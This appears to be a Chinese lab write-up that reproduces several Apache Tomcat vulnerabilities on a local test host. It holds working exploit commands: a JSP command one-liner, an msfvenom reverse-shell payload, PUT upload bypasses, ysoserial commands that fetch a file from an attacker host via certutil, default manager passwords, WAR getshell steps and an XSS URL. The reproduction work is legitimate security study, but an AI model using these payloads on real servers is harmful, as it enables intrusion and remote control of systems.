## 前言

复现 tomcat 一些漏洞，跟着搭环境也花了点时间，想复现的朋友可以下载我打包好的tomcat，下面的漏洞（除了反射型XSS）都配置了，下载下来可以直接进行复现。



## CVE-2020-1938

----

> Apache-Tomcat-Ajp
> Tomcat服务器存在文件包含漏洞，攻击者可利用该漏洞读取或包含Tomcat上所有webapp目录下的任意文件，如：webapp配置文件或源代码等。

### 影响范围
```
Apache Tomcat 6
Apache Tomcat 7 < 7.0.100
Apache Tomcat 8 < 8.5.51
Apache Tomcat 9 < 9.0.31
```

### 复现步骤

通过扫描端口，发现 ajp 协议
> 默认端口：8009  ajp13，8007 ajp12

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140032213-1868106180.png)


#### 文件读取

下载POC：
```
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
```
读取文件：
```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.64.129 -p 8009 -f WEB-INF/web.xml
```

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140047608-56726701.png)


#### 文件包含

> 大佬的文章：https://www.t00ls.net/thread-55062-1-1.html

执行命令的一句话，通过上传上去
```jsp
<%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine());%>
```
文件包含：
```
python3 2020-10487.py 192.168.64.129 -p 8009 -f 1.jpg --rce 1
```
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140103416-587577170.png)

还可以通过 MSF 生成 jsp shell，把 1.png 上传上去
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.64.130 LPORT=4444 > 1.png
```
MSF 监听
```
msfconsole
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set lhost 192.168.64.130
run
```
执行脚本
```
python3 2020-10487.py 192.168.64.129 -p 8009 -f 1.png --rce 1
```
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140119378-1498390668.png)



## CVE-2019-0232

---

### 利用前提

1. 系统：Windows
2. 启用了CGI Servlet（默认为关闭）
3. 启用了enableCmdLineArguments（默认为关闭）

### 影响范围

- Apache Tomcat 9.0.0.M1 to 9.0.17
- Apache Tomcat 8.5.0 to 8.5.39
- Apache Tomcat 7.0.0 to 7.0.93

### 漏洞复测

需要配置：
- https://xz.aliyun.com/t/4875
- https://www.freebuf.com/column/204006.html

效果：
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140213897-552872480.png)



## CVE-2017-12615

---

> https://paper.seebug.org/399/

### 影响范围

- Apache Tomcat 7.0.0 - 7.0.79 (windows环境)

### 绕过方式

- `1.jsp%20`
- `1.jsp::$DATA`
- `1.jsp:/`

### 复现步骤

使用 curl 查看是否支持 PUT 请求
```
curl -i -X OPTIONS http://192.168.64.129:8080/1/  // 给个不存在的目录
```
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140248264-582055400.png)

使用 curl 上传 `.jsp/`
```
curl -X PUT "http://192.168.64.129:8080/test.jsp/" -d '<%out.println("test");%>'
```
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140258988-620899226.png)

使用 Burpsuite 上传`.jsp::$DATA`
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140312690-824418649.png)
`.jsp%20`
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140326399-1500262915.png)

> 网上也有大佬写了GUI或脚本


## CVE-2016-8735

---


### 影响范围

- Apache Tomcat 9.0.0.M1 to 9.0.0.M11
- Apache Tomcat 8.5.0 to 8.5.6
- Apache Tomcat 8.0.0.RC1 to 8.0.38
- Apache Tomcat 7.0.0 to 7.0.72
- Apache Tomcat 6.0.0 to 6.0.47

### 存在问题

>大佬的文章：https://gv7.me/articles/2018/CVE-2016-8735/
>tomcat相同版本，在java 1.8.0_131下无法弹出计算机。觉得这个漏洞应该还和java版本有关。和groovy版本也有关。

### 复现步骤

扫描端口
```
nmap -p 10001,10002 -sC -sV 192.168.64.129
```
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140408233-727297219.png)

执行命令，写到网站目录
```
java -cp ysoserial.jar  ysoserial.exploit.RMIRegistryExploit 192.168.64.129 10001 Groovy1 "cmd.exe /c whoami  > ..\webapps\ROOT\a.txt"
```
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140421076-1914230851.png)

访问

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140437319-1239873008.png)

利用 certutil 下载文件，可以getshell或直接上传exe再执行

```
java -cp ysoserial.jar  ysoserial.exploit.RMIRegistryExploit 192.168.64.129 10001 Groovy1 "certutil.exe -urlcache -split -f http://192.168.64.130:8000/a.jsp ..\webapps\ROOT\a.jsp"
```
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140452484-1067659531.png)



## 管理后台getshell

---

### 弱口令

```
tomcat:tomcat
tomcat:admin
tomcat:123456
admin:admin
admin:123456
```
> 弱口令看运气
> tomcat 6 之后的版本有`防暴机制`

### 低版本暴力破解

> 这里使用了 tomcat 7.x ，配置过了才可以暴力破解，因为懒得再安装低版本

简单的配置
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140527851-1616783615.png)

或者这样（字典，base64编码，关闭URL编码）

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140538961-1021335630.png)

得到账号密码

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140554321-1417530477.png)

输入账号和密码登录

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140607382-1079312498.png)

### 制作 war 包

- 直接压缩 jsp 文件，把压缩包后缀改为 .war  `1.zip.war`
- 使用命令来制作：`jar -cvf a.war a.jsp`

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140618156-1794682248.png)

### getshell

上传 war 包
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140633697-800700764.png)
访问
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140644734-1766842264.png)


## 样例目录session操纵漏洞

---

> 大佬的文章：https://blog.51cto.com/chenjc/1434858

### 漏洞复现

在 examples 目录创建3个jsp文件，分别为：

login.jsp
```
<form action=login2.jsp method="POST" >  

    user: <input type="text"name="username"><br> 
    pass: <input type="text" name="password"><br> 

    <input type="submit" value="login"><br> 

</form>
```

login2.jsp
```
<% 

  if(request.getParameter("username") != null && request.getParameter("password")!= null) {  
    String username =request.getParameter("username"); 
    String password =request.getParameter("password"); 
    
//验证身份 
    if (username.equals("admin")&& password.equals("password")) {  
        session.setAttribute("login","admin"); 
        response.sendRedirect("index.jsp"); 
    }else { 
        response.sendRedirect("login.jsp"); 
    }  
} 

%>
```
index.jsp
```
<% 

	if(session.getAttribute("login")!= null && ((String)session.getAttribute("login")).equals("admin")){ 

		out.println("success"); 

	} else{

		response.sendRedirect("login.jsp");

	}

%>
```

访问：http://192.168.64.129:8080/examples/index.jsp  提示跳转到 login.jsp

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140722713-1840846624.png)

访问：http://192.168.64.129:8080/examples/servlets/servlet/SessionExample 输入信息
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140734738-1183965546.png)
再次访问 index.jsp，就不需要登录了
![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140746725-1545622885.png)



## 反射型XSS

---

### 影响范围

- Tomcat 4.1.31 ~ Tomcat 5.5.15

### 漏洞复现

```
http://192.168.64.129:8080/jsp-examples/cal/cal2.jsp?time=1%3Cscript%3Ealert(1)%3C/script%3E
```

![](https://img2020.cnblogs.com/blog/1954962/202011/1954962-20201110140832903-1596843521.png)






